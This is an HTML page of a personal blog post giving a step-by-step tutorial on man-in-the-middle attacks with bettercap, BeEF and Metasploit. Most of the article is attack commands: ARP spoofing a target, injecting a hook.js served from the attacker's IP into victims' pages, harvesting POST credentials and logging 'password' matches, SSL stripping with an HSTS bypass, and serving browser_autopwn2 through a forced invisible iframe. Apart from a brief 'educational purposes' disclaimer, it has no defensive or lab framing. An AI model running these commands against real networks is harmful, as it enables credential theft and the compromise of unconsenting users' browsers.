<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Network Security Man in the Middle(MITM) Attacks</title>
  <meta property="og:title" content="Network Security Man in the Middle(MITM) Attacks" />
  <meta name="twitter:title" content="Network Security Man in the Middle(MITM) Attacks" />
  <meta name="description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
Disclaimer: The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.
What Is MITM? This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.">
  <meta property="og:description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
Disclaimer: The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.
What Is MITM? This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.">
  <meta name="twitter:description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
Disclaimer: The content shared below is meant for educational purposes and the writer is not â€¦">
  <meta name="author" content="Stephen Kanyi"/>
  <link href='https://Skanyi.github.io/blog/img/avatar-icon.png' rel='icon' type='image/x-icon'/>
  <meta property="og:image" content="https://Skanyi.github.io/blog/img/logo.jpg" />
  <meta name="twitter:image" content="https://Skanyi.github.io/blog/img/logo.jpg" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@StephenKanyiW" />
  <meta name="twitter:creator" content="@StephenKanyiW" />
  <meta property="og:url" content="https://Skanyi.github.io/blog/cyber-security/network-security-man-in-the-middle-attacks/" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Kanyi Blog" />

  <meta name="generator" content="Hugo 0.30" />
  <link rel="canonical" href="https://Skanyi.github.io/blog/cyber-security/network-security-man-in-the-middle-attacks/" />
  <link rel="alternate" href="https://Skanyi.github.io/blog/index.xml" type="application/rss+xml" title="Kanyi Blog">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="https://Skanyi.github.io/blog/css/main.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
  <link rel="stylesheet" href="https://Skanyi.github.io/blog/css/pygment_highlights.css" />
  <link rel="stylesheet" href="https://Skanyi.github.io/blog/css/highlight.min.css" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />



<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

</head>

  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://Skanyi.github.io/blog/">Kanyi Blog</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="DevOps" href="/blog/devops/">DevOps</a>
            </li>
          
        
          
            <li>
              <a title="Development" href="/blog/development/">Development</a>
            </li>
          
        
          
            <li>
              <a title="Security" href="/blog/cyber-security/">Security</a>
            </li>
          
        
          
            <li>
              <a title="About" href="/blog/page/about/">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    <div class="avatar-container">
      <div class="avatar-img-border">
        
          <a title="Kanyi Blog" href="https://Skanyi.github.io/blog/">
            <img class="avatar-img" src="https://Skanyi.github.io/blog/img/logo.jpg" alt="Kanyi Blog" />
          </a>
        
      </div>
    </div>

  </div>
</nav>




    
  
  
  




  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="cyber-security-heading">
              <h1>Network Security Man in the Middle(MITM) Attacks</h1>
                
                
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        

<p>In this Article Will be trying to explain how to perform a MITM attack with bettercap + beef + metasploit.</p>

<h4 id="disclaimer">Disclaimer:</h4>

<p>The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.</p>

<h3 id="what-is-mitm">What Is MITM?</h3>

<p>This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.
<img src="/blog/images/mitm/mitm.png" alt="" /></p>

<h3 id="beef-bettercap-metasploit">BEEF + Bettercap + Metasploit.</h3>

<p>So lets get prepping:</p>

<p>First we enable metasploit extension in beef folder.
Open <code>extensions/metasploit/config.yaml</code> and set;</p>

<p><code>enable: true</code></p>

<p><code>host: ATTACKER-IP</code></p>

<p><code>callback_host: ATTACKER-IP</code></p>

<p>It goes without saying that the ATTACKER-IP is the IP of your Kali.</p>

<p>Create a file in a directory of your choice that will have some parameters that were in extensions/metasploit/config.yaml.
Lets create beef_to_msf and echo the following into it.</p>

<p><code>echo load msgrpc ServerHost:ATTACKER-IP User=msf Pass=abc123 SSL=y &gt; beef_to_msf</code></p>

<h3 id="start-metasploit">Start metasploit</h3>

<p><code>msfconsole -r beef_to_msf</code></p>

<p>Open Beef from another terminal. You can also open it from the apps.
<code>./beef -x</code></p>

<h3 id="start-bettercap">Start bettercap:</h3>

<p>There are several things we can do here;</p>

<ol>
<li><p>Use bettercap to spoof the target.</p>

<p><code>bettercap -T &lt;targetIp&gt; --proxy -P POST</code>
<img src="/blog/images/mitm/login.png" alt="" /> <img src="/blog/images/mitm/pass.png" alt="" /></p></li>

<li><p>Inject beef hook.js with bettercap</p>

<p><code>bettercap -T &lt;targetIp&gt; --proxy-module injectjs --js-url &quot;http://&lt;myip&gt;:3000/hook.js&quot;</code></p>

<p>You can view the source page and search for the hook.js script. If it is there, give beef few seconds and it will hook the browser.
<img src="/blog/images/mitm/source.png" alt="" /></p>

<p><img src="/blog/images/mitm/hook.png" alt="" /></p></li>

<li><p>Combine the two above dumping all the logs into a file.</p>

<p><code>bettercap -T &lt;targetIp&gt; --proxy-module injectjs --js-url &quot;http://&lt;myip&gt;:3000/hook.js&quot; -P POST --log LOG_FILE</code></p>

<p>Taking a look at the file created by the above command and searching through for username and password. It will still hook the browser
<img src="/blog/images/mitm/logs.png" alt="" /></p></li>
</ol>

<p>After the succesful hooking.</p>

<p>We can now start using BeEF framework  and start social engineering our target. I will not be showing how to use beef in this post.</p>

<h3 id="optional-metasploit">Optional - Metasploit:</h3>

<p>load the newest version of browser_autopwn called just browser_autopwn2
 <code>use auxiliary/server/browser_autopwn2</code></p>

<p>Set the required fileds.</p>

<p>SRVHOST = attackerip</p>

<p>URIPATH = /kid    #kid can anything you want</p>

<p>EXCLUDE_PATTERN = android #for example if an attack is aimed at pc, you can exclude android.</p>

<p>ShowExploitList = true</p>

<p>VERBOSE = true</p>

<h3 id="example">Example</h3>

<p><code>set SRVHOST 192.168.12.145</code></p>

<p>Launch the attack</p>

<p><code>run</code></p>

<p><img src="/blog/images/mitm/msf.png" alt="" /></p>

<p>This will give another url that our victim should open but luckily for us, we don&rsquo;t to send it again to the user. We ca use beef to force the client to open it.</p>

<p><code>Commands &gt; Misc &gt; Create invisible Iframe</code></p>

<h3 id="how-does-the-exploit-work">How does the exploit work.</h3>

<p>When the user open the url created, it tries all the loaded exploits  - when one executes succesfully, it creates a session in the background.</p>

<p>Forward the traffic between the server and target.</p>

<p><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p>

<p>This will ensure that the traffic reach its intended destination.</p>

<h4 id="nb">NB</h4>

<p>If my machine loose internet, restart the interface
<code>ifconfig eth0 down &amp;&amp; ifconfig eth0 up</code></p>

<h3 id="other-command-you-can-try-with-bettercap">Other Command you can try with bettercap.</h3>

<p>Now next we try to do arp spoofing.
 <code>bettercap -T &lt;targetIp&gt; --proxy -P POST</code>
  the above command is supposed to even handle sslstripping for us helping us bypass the certificate warning.</p>

<p>Sniff without making so much noise.
  <code>bettercap -X --no-spoofing</code></p>

<p>Sniff and spoof at the same time
  <code>bettercap -X</code></p>

<p>Sniff with a specific protocal.
  <code>bettercap -XP HTTPS</code></p>

<p>Log the result into a file
  <code>bettercap --log LOG_FILE</code></p>

<h3 id="spoofing">Spoofing:</h3>

<p><code>bettercap -S ARP</code>
if you don&rsquo;t specify the -S option, it uses ARP by default.</p>

<h3 id="sniffing-credentials-harvesting">Sniffing &amp; Credentials Harvesting:</h3>

<p>Spoof and save every captured packet into a file.
<code>bettercap --sniffer-output ~/capture.pcap</code></p>

<p>Use pcap file as source of packets
<code>bettercap --sniffer-source ~/capture.pcap</code></p>

<p>Spoof the whole network and sniff only http traffic
<code>bettercap --sniffer-filter &quot;tcp port http&quot;</code></p>

<p>Spoof whole network and extract data containing &lsquo;password&rsquo; word.
<code>bettercap --custom-parser &quot;.*password.*&quot;</code></p>

<h3 id="ssl-stripping">SSL Stripping:</h3>

<p>This technique will replace every https link in webpages the target is browsing with http ones so, if a page would normally look like:</p>

<p>~~~<a href="https://www.facebook.com/">https://www.facebook.com/</a> ~~~</p>

<p>It will look like:</p>

<p>~~~ <a href="http://www.facebook.com/">http://www.facebook.com/</a> ~~~</p>

<p>HTTP Strict Transport Security (HSTS) - help to protect websites against protocol downgrade attacks and cookie hijacking.</p>

<p>We have sslstrip2 that bypass HSTS:
Let&rsquo;s take the previous example page:</p>

<p>~~~ <a href="https://www.facebook.com/~~~">https://www.facebook.com/~~~</a></p>

<p>A HSTS bypass attack will change it to something like:</p>

<p>~~~ <a href="http://wwww.facebook.com/">http://wwww.facebook.com/</a> ~~~</p>

<p>Notice that https has been downgraded to http and www replaced with wwww. Therefore no HSTS rule will be applied since no such rule for that subdomain was created.</p>

<p>The following command perform SSL Stripping and HSTS Bypass attacks in order to capture the traffic/credentials of a specific target.
<code>bettercap -T &lt;targetIP&gt; --proxy -P POST</code></p>

      </article>

      <ul class="pager blog-pager">
        
          <li class="previous">
            <a href="https://Skanyi.github.io/blog/cyber-security/spydersec-challenge/" data-toggle="tooltip" data-placement="top" title="SpyderSec Challenge">&larr; Previous Post</a>
          </li>
        
        
          <li class="next">
            <a href="https://Skanyi.github.io/blog/cyber-security/what-is-dos-how-to-perform-dos-how-to-defend-against-dos/" data-toggle="tooltip" data-placement="top" title="What Is DOS? How To Perform DOS? How To Defend Against DOS?">Next Post &rarr;</a>
          </li>
        
      </ul>

      
        
          <div class="disqus-comments">
            <div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "kanyi" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          </div>
        
      

    </div>
  </div>
</div>

    <footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
                <a href="mailto:tokanyi@gmail.com" title="Email me">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://github.com/andela-skanyi" title="GitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
                <a href="https://twitter.com/StephenKanyiW" title="Twitter">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
          <li>
            <a href="https://Skanyi.github.io/blog/index.xml" title="RSS">
              <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x"></i>
                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              Stephen Kanyi
                      
          
          
          &nbsp;&bull;&nbsp;
          2018

          
            &nbsp;&bull;&nbsp;
            <a href="https://Skanyi.github.io/blog/">Kanyi Blog</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="http://gohugo.io">Hugo v0.30</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
          
        </p>
      </div>
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script src="https://Skanyi.github.io/blog/js/main.js"></script>
<script src="https://Skanyi.github.io/blog/js/highlight.min.js"></script>
<script> hljs.initHighlightingOnLoad(); </script>
<script> renderMathInElement(document.body); </script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>
<script src="https://Skanyi.github.io/blog/js/load-photoswipe.js"></script>



  </body>
</html>

